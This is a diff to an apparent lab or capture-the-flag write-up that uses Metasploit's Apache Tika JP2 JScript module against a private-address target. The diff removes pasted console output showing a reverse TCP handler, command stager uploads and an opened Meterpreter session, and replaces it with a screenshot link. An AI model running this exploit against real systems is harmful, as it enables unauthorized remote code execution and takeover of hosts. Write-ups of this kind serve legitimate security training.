@@ -102,36 +102,7 @@ msf6 exploit(windows/http/apache_tika_jp2_jscript) > set rport 61777
 rport => 61777
 msf6 exploit(windows/http/apache_tika_jp2_jscript) > exploit
 
-[*] Started reverse TCP handler on 10.10.177.69:4444 
-[*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target is vulnerable.
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -   8.10% done (7999/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  16.19% done (15998/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  24.29% done (23997/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  32.39% done (31996/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  40.48% done (39995/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  48.58% done (47994/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  56.67% done (55993/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  64.77% done (63992/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  72.87% done (71991/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  80.96% done (79990/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  89.06% done (87989/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Command Stager progress -  97.16% done (95988/98798 bytes)
-[*] Sending PUT request to 10.10.179.83:61777/meta
-[*] Sending stage (175686 bytes) to 10.10.179.83
-[*] Command Stager progress - 100.00% done (98798/98798 bytes)
-[*] Meterpreter session 1 opened (10.10.177.69:4444 -> 10.10.179.83:49859) at 2024-08-04 20:33:28 +0000
-
 meterpreter > 
+
+![meterpreter1](https://github.com/user-attachments/assets/acc264f0-ebee-4d8a-af21-ef4617749a9f)
+
